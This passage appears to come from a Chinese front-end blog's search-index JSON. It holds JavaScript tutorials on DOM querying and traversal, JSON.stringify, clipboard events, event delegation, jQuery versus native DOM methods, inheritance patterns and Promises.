value=&quot;显示数量&quot; id=&quot;btnShowCount&quot;/&gt;&lt;input type=&quot;button&quot; value=&quot;新增div&quot; id=&quot;btnAddDiv&quot;/&gt;\tvar divList = document.getElementsByTagName(&quot;div&quot;);document.getElementById(&quot;btnAddDiv&quot;).onclick = function()&#123;\tvar div = document.createElement(&quot;div&quot;);\tdiv.textContent =&quot;div&quot; + (divList.length+1);\tdocument.body.appendChild(div);&#125;\tdocument.getElementById(&quot;btnShowCount&quot;).onclick = function()&#123;        alert(divList.length);&#125;\n\n\n这段代码中有两个按钮，一个按钮是显示HTMLCollection元素的个数，另一个按钮可以新增一个div标签到文档中。前面提到HTMLCollcetion元素是即时的表示该集合是随时变化的，也就是是文档中有几个div，它会随时进行变化，当我们新增一个div后，再访问HTMLCollection时，就会包含这个新增的div\n使用document.getElementsByTagName这个方法有几点要注意：\n如果要对HTMLCollection集合进行循环操作，最好将其长度缓存起来，因为每次循环都会去计算长度，暂时缓存起来可以提高效率\n如果没有存在指定的标签，该接口返回的不是null，而是一个空的HTMLCollection\n“*”表示所有标签\n\n\n\n5.3 document.getElementsByName\n\ngetElementsByName主要是通过指定的name属性来获取元素，它返回一个即时的NodeList对象。一般用于获取表单元素的·name·属性\n使用这个接口主要要注意几点：\n返回对象是一个即时的NodeList，它是随时变化的\n在HTML元素中，并不是所有元素都有name属性，比如div是没有name属性的，但是如果强制设置div的name&#96;属性，它也是可以被查找到的\n在IE中，如果id设置成某个值，然后传入getElementsByName的参数值和id值一样，则这个元素是会被找到的，所以最好不好设置同样的值给id和name\n\n\n\n5.4 document.getElementsByClassName\n\n这个API是根据元素的class返回一个即时的HTMLCollection，用法如下\n\nvar elements = document.getElementsByClassName(names);\n\n\n这个接口有下面几点要注意：\n返回结果是一个即时的HTMLCollection，会随时根据文档结构变化\nIE9以下浏览器不支持\n如果要获取2个以上classname，可传入多个classname，每个用空格相隔，例如\n\n\n\nvar elements = document.getElementsByClassName(&quot;test1 test2&quot;);\n\n5.5 document.querySelector和document.querySelectorAll\n\n这两个api很相似，通过css选择器来查找元素，注意选择器要符合CSS选择器的规则\n首先来介绍一下document.querySelector\ndocument.querySelector返回第一个匹配的元素，如果没有匹配的元素，则返回null。\n注意，由于返回的是第一个匹配的元素，这个api使用的深度优先搜索来获取元素\n\n&lt;div&gt;    &lt;div&gt;        &lt;span class=&quot;test&quot;&gt;第三级的span&lt;/span&gt;\t    &lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;test&quot;&gt;\t\t\t    同级的第二个div&lt;/div&gt;&lt;input type=&quot;button&quot; id=&quot;btnGet&quot; value=&quot;获取test元素&quot; /&gt;document.getElementById(&quot;btnGet&quot;).addEventListener(&quot;click&quot;,function()&#123;\tvar element = document.querySelector(&quot;.test&quot;);\talert(element.textContent);&#125;)\n\n\n这个例子很简单，就是两个class都包含“test”的元素，一个在文档树的前面，但是它在第三级，另一个在文档树的后面，但它在第一级，通过querySelector获取元素时，它通过深度优先搜索，拿到文档树前面的第三级的元素\ndocument.querySelectorAll的不同之处在于它返回的是所有匹配的元素，而且可以匹配多个选择符\n\n&lt;div class=&quot;test&quot;&gt;    class为test&lt;/div&gt;&lt;div id=&quot;test&quot;&gt;    id为test&lt;/div&gt;&lt;input id=&quot;btnShow&quot; type=&quot;button&quot; value=&quot;显示内容&quot; /&gt;document.getElementById(&quot;btnShow&quot;).addEventListener(&quot;click&quot;,function()&#123;\tvar elements = document.querySelectorAll(&quot;#test,.test&quot;);\t\tfor(var i = 0,length = elements.length;i&lt;length;i++)&#123;\t\talert(elements[i].textContent);\t&#125;\t&#125;)\n\n\n这段代码通过querySelectorAll，使用id选择器和class选择器选择了两个元素，并依次输出其内容。要注意两点：\nquerySelectorAll也是通过深度优先搜索，搜索的元素顺序和选择器的顺序无关\n返回的是一个非即时的NodeList，也就是说结果不会随着文档树的变化而变化\n\n\n兼容性问题：querySelector和querySelectorAll在ie8以下的浏览器不支持\n小结：\ndocument.getElementById返回一个对象\ndocument.getElementsByName和document.getElementsByClasName返回一个对象数组\n\n\n\n六、节点关系型API\n\n\n在html文档中的每个节点之间的关系都可以看成是家谱关系，包含父子关系，兄弟关系等等\n\n6.1 父关系型API\n\nparentNode：每个节点都有一个parentNode属性，它表示元素的父节点。Element的父节点可能是Element，Document或DocumentFragment\nparentElement：返回元素的父元素节点，与parentNode的区别在于，其父节点必须是一个Element，如果不是，则返回null\n\n6.2 兄弟关系型API\n\npreviousSibling：节点的前一个节点，如果该节点是第一个节点，则为null。注意有可能拿到的节点是文本节点或注释节点，与预期的不符，要进行处理一下\npreviousElementSibling：返回前一个元素节点，前一个节点必须是Element，注意IE9以下浏览器不支持\nnextSibling previousSibling 存在兼容性问题\nnextElementSibling previousElementSibling 推荐使用\n\n&lt;script&gt;    var oUl = document.getElementById(&#x27;ul1&#x27;);    var firstEle = oUl.firstElementChild;    var lastEle = oUl.lastElementChild;    firstEle.nextElementSibling.style.background = &#x27;red&#x27;;    lastEle.previousElementSibling.style.background = &#x27;green&#x27;;&lt;/script&gt;\n\n\n\nnextSibling：节点的后一个节点，如果该节点是最后一个节点，则为null。注意有可能拿到的节点是文本节点，与预期的不符，要进行处理一下\nnextElementSibling：返回后一个元素节点，后一个节点必须是Element，注意IE9以下浏览器不支持\n\n6.3 子关系型API\n\n&#96;&#96;&#96;childNodes：- 返回一个即时的`NodeList`，表示元素的子节点列表，子节点可能会包含文本节点，注释节点等。`childNodes`子节点列表集合（只读属性 有兼容性问题 ）\n\n  11111\n  22222\n  3333\n  44444\n\n\n  var oUl = document.getElementById('ul1');\n  console.log(oUl.childNodes);\n\n![img](http://7xq6al.com1.z0.glb.clouddn.com/d10.png)- 从截图中可以看出 这段代码中`ul`的子节点有`9`个，这说明使用`childNodes`获取的节点包括了文本节点和元素节点- `childNodes` 在低版本的`ie` 浏览器下获取的节点只包括元素节点，这就导致了兼容性问题- 如何解决兼容性？？  - 根据子节点的`nodeType`属性值判断\nfor (var i=0; i","categories":["前端"],"tags":["javascript"]},{"title":"js JSON.Stringify","url":"/2017/12/22/html+css+js+ts/3-js-json.stringify/","content":"一、JSON.stringify参数详解\nstringify方法顾名思义，就是把JSON序列化，其语法如下\n\nJSON.stringify(value [, replacer] [, space])\n\n\nvalue：是必选字段。就是你输入的对象、如数组等\n\nreplacer：这个是可选的。它又分为2\n种方式，一种是数组，第二种是方法【过滤函数，或者key的过滤数组（只有在数组中的会展示）】\n\n情况一：replacer为数组时，通过后面的实验可以知道，它是和第一个参数value有关系的。一般来说，系列化后的结果是通过键值对来进行表示的。 所以，如果此时第二个参数的值在第一个存在，那么就以第二个参数的值做key，第一个参数的值为value进行表示，如果不存在，就忽略。\n情况二：replacer为方法时，那很简单，就是说把系列化后的每一个对象（记住是每一个）传进方法里面进行处理。\n\n\n&#96;&#96;&#96;space\n  ：就是用什么来做分隔符的【格式化前面的空格字符】  - 如果省略的话，那么显示出来的值就没有分隔符，直接输出来  - 如果是一个数字的话，那么它就定义缩进几个字符，当然如果大于`10` ，则默认为`10`，因为最大值为`10`  - 如果是一些转义字符，比如`\\t`，表示回车，那么它每行一个回车。  - 如果仅仅是字符串，就在每行输出值的时候把这些字符串附加上去。当然，最大长度也是`10`个字符## 二、只传一个参数\nvar obj &#x3D; {name:”poetries”,age:22,job:”FED”,location:”shenzhen of China”};\n\n\nJSON.stringify(obj)  &#x2F;&#x2F;“{“name”:”poetries”,”age”:22,”job”:”FED”,”location”:”shenzhen of China”}”\n**注意点**&gt; `JSON.stringify`对`obj`里面的数据类型有一些要求- 非数组对象的属性不能保证以特定的顺序出现在序列化后的字符串中\nJSON.stringify({x: 5, y: 6}) &#x2F;&#x2F; ‘{“x”:5,”y”:6}’ 或者 ‘{“y”:6,”x”:5}’ 都可能\n- 布尔值、数字、字符串的包装对象在序列化过程中会自动转换成对应的原始值- `undefined`、任意的函数以及 `symbol` 值，在序列化过程中会被忽略（出现在非数组对象的属性值中时）或者被转换成 `null`（出现在数组中时）\nvar obj &#x3D; {  “undefined”:undefined,  “null”:null,  “true”:true,  “func”:function(){},  “symbol”:Symbol(“”)};JSON.stringify(obj); &#x2F;&#x2F;“{“null”:null,”true”:true}”\n&#x2F;&#x2F; 出现在数组中时被转化成nullvar arr &#x3D; [undefined,Symbol(“”),function(){}];JSON.stringify(arr); &#x2F;&#x2F;[null,null,null]\n- 不可枚举的属性会被忽略\nJSON.stringify( Object.create(null, { x: { value: ‘x’, enumerable: false }, y: { value: ‘y’, enumerable: true } }) );&#x2F;&#x2F; ‘{“y”:”y”}’\n## 三、传递两个参数的时候&gt; - 第二个参数可以是一个过滤函数，也可以是一个数组&gt; - 当为数组时则只有包含在这个数组中的属性名才会被序列化到最终的 `JSON` 字符串中### 3.1 过滤函数- 注意点：  - 这里一定要`return`一个值给下一个遍历函数作为参数传入，如果不`return`的话，后面的遍历就没法玩下去了\nvar obj &#x3D; {  name:”poetries”,  age:22,  job:”FED”,  location:”shenzhen of China”};\nJSON.stringify(obj, (key,value) &#x3D;&gt; {   console.log(key)   return value; &#x2F;&#x2F; 这个是必须的，用于下一次的循环迭代})\n### 3.2 数组\nvar obj &#x3D; {  name:”poetries”,  age:22,  job:”FED”,  location:”shenzhen of China”};JSON.stringify(obj, [“name”, “age”]);\n&#x2F;&#x2F;job、location由于不在列表里，所以没被序列化&#x2F;&#x2F;“{“name”:”poetries”,”age”:22}”\n## 四、传递三个参数的时候&gt; 第三参数space用来控制结果字符串里面的间距- 如果是一个数字, 则在字符串化时每一级别会比上一级别缩进多这个数字值的空格（最多10个空格）- 如果是一个字符串，则每一级别会比上一级别多缩进用该字符串（或该字符串的前十个字符）\nvar obj &#x3D; {name:”poetries”,age:22,job:”FED”,location:”shenzhen of China”,lov:{age:11}};JSON.stringify(obj, null,10);&#x2F;&#x2F; &#x2F;&#x2F;每一个层级比上一个多10个空格“{          “name”: “poetries”,          “age”: 22,          “job”: “FED”,          “location”: “shenzhen of China”,          “lov”: {                    “age”: 11          }}”var obj &#x3D; {  name:”poetries”,  age:22,  job:”FED”,  location:”shenzhen of China”,  lov:{    age:11  }};JSON.stringify(obj, null,”\\n”);&#x2F;&#x2F; 每一个层级比上一个多了一个回车符“{\n“name”: “poetries”,\n“age”: 22,\n“job”: “FED”,\n“location”: “shenzhen of China”,\n“lov”: {\n“age”: 11\n}}”\n## 五、toJSON 方法&gt; 如果一个被序列化的对象拥有 `toJSON` 方法，那么该 `toJSON` 方法就会覆盖该对象默认的序列化行为\nvar obj &#x3D; {  name:”poetries”,  info:{    age:18,    sex:”male”  },  toJSON:function(){    return “via toJSON”;  }};\nJSON.stringify(obj); &#x2F;&#x2F; “”via toJSON””&#96;&#96;&#96;\n","categories":["前端"],"tags":["javascript"]},{"title":"js-复制粘贴","url":"/2018/01/19/html+css+js+ts/3-js-%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4/","content":"一、基本使用1.1 API 介绍复制、剪切、粘贴事件\n\ncopy 发生复制操作时触发;\ncut 发生剪切操作时触发;\npaste 发生粘贴操作时触发\n\n\n每个事件都有一个 before 事件对应：beforecopy、beforecut、beforepaste。这几个 before一般不怎么用，所以我们把注意力放在另外三个事件就可以了\n\n触发条件\n\n鼠标右键菜单的复制、粘贴、剪切\n使用了相应的键盘组合键，比如:command+c、command+v\n\n使用姿势\n\n以 copy 为例\n\ndocument.body.oncopy = e =&gt; &#123;  // 监听全局复制 做点什么&#125;;// 还有这种写法：document.addEventListener(&#x27;copy&#x27;, e =&gt; &#123;  // 监听全局复制 做点什么&#125;);\n\n\n上面是在document.body上全局监听的，然而很多人不知道的是，我们还可以为某些 dom 单独添加剪切板事件\n\n// html结构&lt;div id=&quot;test1&quot;&gt;&lt;/div&gt;&lt;div id=&quot;test2&quot;&gt;&lt;/div&gt;&lt;script&gt;    // 写法一样：    let test1 = document.querySelector(&#x27;#test1&#x27;);    test1.oncopy = e =&gt; &#123;        // 监听test1发生的复制事件 做点什么        // test1发生的复制事件会触发回调，其他地方不会触发回调    &#125;&lt;/script&gt;\n\n\n其他事件也是一样的\n\n1.2 clipboardDataclipboardData 对象:用于访问以及修改剪贴板中的数据\n\n不同浏览器，所属的对象不同：在 IE 中这个对象是window对象的属性，在Chrome、Safari和Firefox中，这个对象是相应的event对象的属性。所以我们在使用的时候，需要做一下如下兼容\n\ndocument.body.oncopy = e =&gt; &#123;  let clipboardData = e.clipboardData || window.clipboardData;  // 获取clipboardData对象 + do something&#125;;\n\n对象方法\n\n对象有三个方法: getData()、setData()、clearData()\n\ngetData() 访问剪切板中的数据\n\ngetData()接受一个text参数，即要取得的数据的格式\n\n在复制、剪切、粘贴触发的事件的数据\n\n实际上在 chorme 上测试只有paste粘贴的时候才能用getData()访问到数据，用法如下\n\n// 要粘贴的数据：document.body.onpaste = e =&gt; &#123;  let clipboardData = e.clipboardData || window.clipboardData; // 兼容处理  console.log(&#x27;要粘贴的数据&#x27;, clipboardData.getData(&#x27;text&#x27;));&#125;;\n\n被复制&#x2F;剪切的数据：\n\n在复制和剪切中的数据，需要通过window.getSelection(0).toString()来访问:\n\ndocument.body.oncopy = e =&gt; &#123;  console.log(&#x27;被复制的数据:&#x27;, window.getSelection(0).toString());&#125;;\n\nsetData(): 修改剪切板中的数据\n\n第一个参数也是text，第二个参数是要放在剪切板中的文本\n\nclearData()\n二、应用2.1 复制大段文本实现类知乎&#x2F;掘金复制大段文本添加版权信息\n\n实现很简单：取消默认复制之后，主要是在被复制的内容后面添加信息，然后根据 clipboardData 的 setData()方法将信息写入剪贴板\n\n// 掘金这里不是全局监听，应该只是监听文章的dom范围内。document.body.oncopy = event =&gt; &#123;  event.preventDefault(); // 取消默认的复制事件  let textFont,    copyFont = window.getSelection(0).toString(); // 被复制的文字 等下插入  // 防知乎掘金 复制一两个字则不添加版权信息 超过一定长度的文字 就添加版权信息  if (copyFont.length &gt; 10) &#123;    textFont =      copyFont +      &#x27;\\n&#x27; +      &#x27;作者：OBKoro1\\n&#x27; +      &#x27;链接：https://juejin.im/user/58714f0e325b123db4a2eb95372/posts\\n&#x27; +      &#x27;来源：掘金\\n&#x27; +      &#x27;著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。&#x27;;  &#125; else &#123;    textFont = copyFont; // 没超过十个字 则采用被复制的内容。  &#125;  if (event.clipboardData) &#123;    return event.clipboardData.setData(&#x27;text&#x27;, textFont); // 将信息写入粘贴板  &#125; else &#123;    // 兼容IE    return window.clipboardData.setData(&#x27;text&#x27;, textFont);  &#125;&#125;;\n\n\n然后 command+c、command+v，输出:\n\n你复制的内容作者：OBKoro1链接：https://juejin.im/user/58714f0eb123db4a2eb95372/posts来源：掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n2.2 防复制功能\n禁止复制+剪切\n禁止右键，右键某些选项:全选，复制，粘贴等。\n禁用文字选择，能选择却不能复制，体验很差。\nuser-select 用 css 禁止选择文本\n\n// 禁止右键菜单document.body.oncontextmenu = e =&gt; &#123;    console.log(e, &#x27;右键&#x27;);    return false;    // e.preventDefault();&#125;;// 禁止文字选择。document.body.onselectstart = e =&gt; &#123;    console.log(e, &#x27;文字选择&#x27;);    return false;    // e.preventDefault();&#125;;// 禁止复制document.body.oncopy = e =&gt; &#123;    console.log(e, &#x27;copy&#x27;);    return false;    // e.preventDefault();&#125;// 禁止剪切document.body.oncut = e =&gt; &#123;    console.log(e, &#x27;cut&#x27;);    return false;    // e.preventDefault();&#125;;// 禁止粘贴document.body.onpaste = e =&gt; &#123;    console.log(e, &#x27;paste&#x27;);    return false;    // e.preventDefault();&#125;;/** css 禁止文本选择 这样不会触发js**/body &#123;    user-select: none;    -moz-user-select: none;    -webkit-user-select: none;    -ms-user-select: none;&#125;\n\n\n使用e.preventDefault()也可以禁用，但建议使用return false这样就不用去访问e和e的方法了。\n示例中document.body全局都禁用了，也可以对 dom(某些区域)进行禁用\n\n破解防复制\n上面的防复制方法通过js+css实现的，所以思路就是：禁用js+取消user-select样式。\n\nChrome浏览器的话：打开浏览器控制台，按F1进入Setting，勾选Disable JavaScript(禁止 js)。\n\n\n\n此时如果还不能复制的话，就要去找user-select样式,取消这个样式就可以了\n\n2.3 点击复制功能不能使用 clipboardData\n\n在 IE 中可以用window.clipboardData.setData(&#39;text&#39;,&#39;内容&#39;)实现\n上文提到过，在 IE 中clipboardData是window的属性\n而其他浏览器则是相应的event对象的属性，这实际上是一种安全措施，防止未经授权的访问,为了兼容其他浏览器，所以我们不能通过clipboardData来实现这种操作\n\n具体做法\n\n创建一个隐藏的input框\n点击的时候，将要复制的内容放进input框中\n选择文本内容input.select()。这里只能用input或者textarea才能选择文本\ndocument.execCommand(&quot;copy&quot;)，执行浏览器的复制命令\n\nfunction copyText() &#123;  var text = document.getElementById(&#x27;text&#x27;).innerText; // 获取要复制的内容也可以传进来  var input = document.getElementById(&#x27;input&#x27;); // 获取隐藏input的dom  input.value = text; // 修改文本框的内容  input.select(); // 选中文本  document.execCommand(&#x27;copy&#x27;); // 执行浏览器复制命令  alert(&#x27;复制成功&#x27;);&#125;\n\n2.4 第三方库clipboard\nhttps://github.com/zenorocha/clipboard.js\n\n","categories":["前端"],"tags":["javascript"]},{"title":"js事件绑定、事件监听、事件委托","url":"/2018/02/13/html+css+js+ts/3-js-%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A%E3%80%81%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E3%80%81%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%89%98/","content":"一、简介\n事件流是一个事件沿着特定数据结构传播的过程。冒泡和捕获是事件流在DOM中两种不同的传播方法\n\n事件流有三个阶段\n\n事件捕获阶段\n处于目标阶段\n事件冒泡阶段\n\n事件捕获\n\n事件捕获（event capturing）：通俗的理解就是，当鼠标点击或者触发dom事件时，浏览器会从根节点开始由外到内进行事件传播，即点击了子元素，如果父元素通过事件捕获方式注册了对应的事件的话，会先触发父元素绑定的事件\n\n事件冒泡\n\n事件冒泡（dubbed bubbling）：与事件捕获恰恰相反，事件冒泡顺序是由内到外进行事件传播，直到根节点\n\n无论是事件捕获还是事件冒泡，它们都有一个共同的行为，就是事件传播\n\n二、捕获和冒泡&lt;div id=&quot;div1&quot;&gt;  &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;    let div1 = document.getElementById(&#x27;div1&#x27;);    let div2 = document.getElementById(&#x27;div2&#x27;);        div1.onClick = function()&#123;        alert(&#x27;1&#x27;)    &#125;        div2.onClick = function()&#123;        alert(&#x27;2&#x27;);    &#125;&lt;/script&gt;\n\n\n当点击 div2时，会弹出两个弹出框。在 ie8/9/10、chrome浏览器，会先弹出”2”再弹出“1”，这就是事件冒泡：事件从最底层的节点向上冒泡传播。事件捕获则跟事件冒泡相反\n\n\nW3C的标准是先捕获再冒泡， addEventListener的第三个参数决定把事件注册在捕获（true）还是冒泡(false)\n\n三、事件对象\n四、事件流阻止\n在一些情况下需要阻止事件流的传播，阻止默认动作的发生\n\n\nevent.preventDefault()：取消事件对象的默认动作以及继续传播。\nevent.stopPropagation()/ event.cancelBubble = true：阻止事件冒泡。\n\n事件的阻止在不同浏览器有不同处理\n\n在IE下使用 event.returnValue= false，\n在非IE下则使用 event.preventDefault()进行阻止\n\npreventDefault与stopPropagation的区别\n\npreventDefault告诉浏览器不用执行与事件相关联的默认动作（如表单提交）\nstopPropagation是停止事件继续冒泡，但是对IE9以下的浏览器无效\n\n五、事件注册\n通常我们使用 addEventListener 注册事件，该函数的第三个参数可以是布尔值，也可以是对象。对于布尔值 useCapture 参数来说，该参数默认值为 false。useCapture 决定了注册的事件是捕获事件还是冒泡事件\n一般来说，我们只希望事件只触发在目标上，这时候可以使用 stopPropagation 来阻止事件的进一步传播。通常我们认为 stopPropagation 是用来阻止事件冒泡的，其实该函数也可以阻止捕获事件。stopImmediatePropagation 同样也能实现阻止事件，但是还能阻止该事件目标执行别的注册事件\n\nnode.addEventListener(&#x27;click&#x27;,(event) =&gt;&#123;\tevent.stopImmediatePropagation()\tconsole.log(&#x27;冒泡&#x27;)&#125;,false);// 点击 node 只会执行上面的函数，该函数不会执行node.addEventListener(&#x27;click&#x27;,(event) =&gt; &#123;\tconsole.log(&#x27;捕获 &#x27;)&#125;,true)\n\n六、事件委托\n在js中性能优化的其中一个主要思想是减少dom操作。\n事件委托就是利用冒泡的原理，把事件加到父元素或祖先元素上，触发执行效果\n提高JavaScript性能。事件委托可以显著的提高事件的处理速度，减少内存的占用\n\n\n假设有100个li，每个li有相同的点击事件。如果为每个Li都添加事件，则会造成dom访问次数过多，引起浏览器重绘与重排的次数过多，性能则会降低。使用事件委托则可以解决这样的问题\n\n原理\n\n实现事件委托是利用了事件的冒泡原理实现的。当我们为最外层的节点添加点击事件，那么里面的ul、li、a的点击事件都会冒泡到最外层节点上，委托它代为执行事件\n\n&lt;ul id=&quot;ul&quot;&gt;    &lt;li&gt;1&lt;/li&gt;    &lt;li&gt;2&lt;/li&gt;    &lt;li&gt;3&lt;/li&gt;&lt;/ul&gt;window.onload = function()&#123;    var ulEle = document.getElementById(&#x27;ul&#x27;);    ul.onclick = function(ev)&#123;        //兼容IE        ev = ev || window.event;        var target = ev.target || ev.srcElement;                if(target.nodeName.toLowerCase() == &#x27;li&#x27;)&#123;            alert( target.innerHTML);        &#125;            &#125;&#125;","categories":["前端"],"tags":["javascript"]},{"title":"js 原生js与jquery操作dom的对比","url":"/2018/03/08/html+css+js+ts/3-js-%E5%8E%9F%E7%94%9FJS%E4%B8%8EjQuery%E6%93%8D%E4%BD%9CDOM%E5%AF%B9%E6%AF%94/","content":"一、创建元素节点\n1.1 原生JS创建元素节点\ndocument.createElement(&quot;p&quot;);\n\n1.2 jQuery创建元素节点\n$(&#x27;&lt;p&gt;&lt;/p&gt;&#x27;);`\n\n二、创建并添加文本节点\n2.1 原生JS创建文本节点\n`document.createTextNode(&quot;Text Content&quot;);\n\n\n通常创建文本节点和创建元素节点配合使用，比如：\n\nvar textEl = document.createTextNode(&quot;Hello World.&quot;);var pEl = document.createElement(&quot;p&quot;);pEl.appendChild(textEl);\n\n2.2 jQuery创建并添加文本节点：\nvar $p = $(&#x27;&lt;p&gt;Hello World.&lt;/p&gt;&#x27;);\n\n三、复制节点\n3.1 原生JS复制节点:\nvar newEl = pEl.cloneNode(true);  `\n\n\n&#96;&#96;&#96;true和false的区别：  - `true` ：克隆整个`&#x27;Hello World.&#x27;`节点  - `false`：只克隆`&#x27;&#x27;` ，不克隆文本`Hello World.&#x27;`#### 3.2 `jQuery`复制节点------\n$newEl &#x3D; $(‘#pEl’).clone(true);- 注意：克隆节点要避免`ID重复### 四、 插入节点------#### 4.1 原生JS向子节点列表的末尾添加新的子节点------\nEl.appendChild(newNode);- 原生JS在节点的已有子节点之前插入一个新的子节点：\nEl.insertBefore(newNode, targetNode);#### 4.2 在jQuery中，插入节点的方法比原生JS多的多------- 在匹配元素子节点列表结尾添加内容\n$(‘#El’).append(‘Hello World.‘);- 把匹配元素添加到目标元素子节点列表结尾\n$(‘Hello World.‘).appendTo(‘#El’);- 在匹配元素子节点列表开头添加内容\n$(‘#El’).prepend(‘Hello World.‘);- 把匹配元素添加到目标元素子节点列表开头\n$(‘Hello World.‘).prependTo(‘#El’);- 在匹配元素之前添加目标内容\n$(‘#El’).before(‘Hello World.‘);- 把匹配元素添加到目标元素之前\n$(‘Hello World.‘).insertBefore(‘#El’);- 在匹配元素之后添加目标内容\n$(‘#El’).after(‘Hello World.‘);- 把匹配元素添加到目标元素之后\n$(‘Hello World.‘).insertAfter(‘#El’);### 五、删除节点------#### 5.1 原生JS删除节点------\nEl.parentNode.removeChild(El);#### 5.2 jQuery删除节点------\n$(‘#El’).remove();### 六、替换节点------#### 6.1 原生JS替换节点------\nEl.repalceChild(newNode, oldNode);- 注意：`oldNode`必须是`parentEl`真实存在的一个子节点#### 6.2 jQuery替换节点------\n$(‘p’).replaceWith(‘Hello World.‘);### 七、设置属性/获取属性------#### 7.1 原生JS设置属性/获取属性------\nimgEl.setAttribute(“title”, “logo”);imgEl.getAttribute(“title”);checkboxEl.checked &#x3D; true;checkboxEl.checked;#### 7.2 jQuery设置属性/获取属性:------\n$(“#logo”).attr({“title”: “logo”});$(“#logo”).attr(“title”);$(“#checkbox”).prop({“checked”: true});$(“#checkbox”).prop(“checked”);\n\n&#96;&#96;&#96;\n","categories":["前端"],"tags":["javascript"]},{"title":"js 继承","url":"/2018/01/22/html+css+js+ts/3-js-%E7%BB%A7%E6%89%BF/","content":"\nJavaScript继承本质和原型链有关\n\n\n原型、实例、构造函数、原型链之间的关系\n\n\n一、借助构造函数实现继承\n缺点：实例无法访问父类原型上的属性\n\nfunction Parent1 () &#123;    this.name = &#x27;parent1&#x27;;&#125;Parent1.prototype.say = function () &#123;&#125;;function Child1 () &#123;    Parent1.call(this);    this.type = &#x27;child1&#x27;;&#125;// Parent1原型上的say没法拿到console.log(new Child1(), new Child1().say());\n\n二、借助原型链实现继承\n缺点：子类和父类公用一个原型,最后导致子类的多个实例都是一样的，无法隔离\n\nfunction Parent2 () &#123;    this.name = &#x27;parent2&#x27;;    this.play = [1, 2, 3];&#125;function Child2 () &#123;    this.type = &#x27;child2&#x27;;&#125;Child2.prototype = new Parent2();var s1 = new Child2();var s2 = new Child2();s1.play.push(4);console.log(s1.play, s2.play); // [1, 2, 3, 4] [1, 2, 3,4] 结果是一样的，说明两个实例无法隔离\n\n三、组合继承方式\n此方法解决了上面的实例相同的问题，但是父类的构造函数执行了多次\n\nfunction Parent3 () &#123;    this.name = &#x27;parent3&#x27;;    this.play = [1, 2, 3];&#125;function Child3 () &#123;    Parent3.call(this);    this.type = &#x27;child3&#x27;;&#125;Child3.prototype = new Parent3(); // 把Parent3的实例指向Child3的原型var s3 = new Child3();var s4 = new Child3();s3.play.push(4);console.log(s3.play, s4.play); // [1, 2, 3, 4] [1, 2, 3]\n\n\n优化组合继承1：此方法解决了父类的构造函数执行了多次问题，但是无法判断实例是由子类创建的，还是父类创建的\n\nfunction Parent4 () &#123;    this.name = &#x27;parent4&#x27;;    this.play = [1, 2, 3];&#125;function Child4 () &#123;    Parent4.call(this);    this.type = &#x27;child4&#x27;;&#125;Child4.prototype = Parent4.prototype; // Child4和Parent4公用一个原型了var s5 = new Child4();var s6 = new Child4();console.log(s5, s6);console.log(s5 instanceof Child4, s5 instanceof Parent4); // 都是返回trueconsole.log(s5.constructor); // 这里返回的构造函数是Parent4，而不是Child4，问题所在​``` - 优化组合继承2：完美解决方案​```javascriptfunction Parent5 () &#123;    this.name = &#x27;parent5&#x27;;    this.play = [1, 2, 3];&#125;function Child5 () &#123;    Parent5.call(this);    this.type = &#x27;child5&#x27;;&#125;Child5.prototype = Object.create(Parent5.prototype);Child5.prototype.constructor = Child5;\t //重新修改了Child5的构造函数为Child5","categories":["前端"],"tags":["javascript"]},{"title":"ES Promise.all/race","url":"/2018/01/01/html+css+js+ts/3-jsPromise%E5%8E%9F%E7%90%86/","content":"一、Promise基础用法1.1 基本用法new Promise(function(resolve, reject) &#123;    //待处理的异步逻辑    //处理结束后，调用resolve或reject方法&#125;)\n\n\n\n新建一个promise很简单，只需要new一个promise对象即可。所以promise本质上就是一个函数，它接受一个函数作为参数，并且会返回promise对象，这就给链式调用提供了基础\n其实Promise函数的使命，就是构建出它的实例，并且负责帮我们管理这些实例。而这些实例有以下三种状态：\n\n\n\npending: 初始状态，位履行或拒绝\nfulfilled: 意味着操作成功完成\nrejected: 意味着操作失败\n\n\npending 状态的 Promise对象可能以 fulfilled状态返回了一个值，也可能被某种理由（异常信息）拒绝（reject）了。当其中任一种情况出现时，Promise 对象的 then 方法绑定的处理方法（handlers）就会被调用，then方法分别指定了resolve方法和reject方法的回调函数\n\n\nvar promise = new Promise(function(resolve, reject) &#123;  if (/* 异步操作成功 */)&#123;    resolve(value);  &#125; else &#123;    reject(error);  &#125;&#125;);promise.then(function(value) &#123;  // 如果调用了resolve方法，执行此函数&#125;, function(value) &#123;  // 如果调用了reject方法，执行此函数&#125;);\n\n\n上述代码很清晰的展示了promise对象运行的机制。下面再看一个示例：\n\nvar getJSON = function(url) &#123;  var promise = new Promise(function(resolve, reject)&#123;    var client = new XMLHttpRequest();    client.open(&quot;GET&quot;, url);    client.onreadystatechange = handler;    client.responseType = &quot;json&quot;;    client.setRequestHeader(&quot;Accept&quot;, &quot;application/json&quot;);    client.send();    function handler() &#123;      if (this.status === 200) &#123;               resolve(this.response);           &#125; else &#123;               reject(new Error(this.statusText));           &#125;    &#125;;  &#125;);  return promise;&#125;;getJSON(&quot;/posts.json&quot;).then(function(json) &#123;  console.log(&#x27;Contents: &#x27; + json);&#125;, function(error) &#123;  console.error(&#x27;出错了&#x27;, error);&#125;);\n\n\n上面代码中，resolve方法和reject方法调用时，都带有参数。它们的参数会被传递给回调函数。reject方法的参数通常是Error对象的实例，而resolve方法的参数除了正常的值以外，还可能是另一个Promise实例，比如像下面这样。\n\nvar p1 = new Promise(function(resolve, reject)&#123;  // ... some code&#125;);var p2 = new Promise(function(resolve, reject)&#123;  // ... some code  resolve(p1);&#125;)\n\n\n上面代码中，p1和p2都是Promise的实例，但是p2的resolve方法将p1作为参数，这时p1的状态就会传递给p2。如果调用的时候，p1的状态是pending，那么p2的回调函数就会等待p1的状态改变；如果p1的状态已经是fulfilled或者rejected，那么p2的回调函数将会立刻执行\n\n1.2 promise捕获错误\nPromise.prototype.catch方法是Promise.prototype.then(null, rejection)的别名，用于指定发生错误时的回调函数\n\ngetJSON(&quot;/visa.json&quot;).then(function(result) &#123;  // some code&#125;).catch(function(error) &#123;  // 处理前一个回调函数运行时发生的错误  